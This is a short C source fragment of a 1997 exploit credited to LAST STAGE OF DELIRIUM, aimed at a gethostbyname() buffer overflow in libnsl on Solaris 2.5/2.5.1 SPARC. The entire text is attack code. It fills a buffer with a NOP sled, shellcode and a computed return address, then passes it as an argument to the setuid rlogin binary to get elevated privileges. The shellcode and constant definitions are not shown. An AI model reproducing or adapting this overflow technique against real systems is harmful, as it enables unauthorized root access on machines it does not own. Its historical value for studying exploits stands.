main(int argc,char **argv){
    char buffer[10000],adr[4],*b; 
    int i;

    printf("copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\n");
    printf("libnsl.so gethostbyname() for solaris 2.5 2.5.1 sparc\n\n");

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()-7988+5460;

    b=buffer;
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    execle("/usr/bin/rlogin","rlogin",buffer,0,0);
}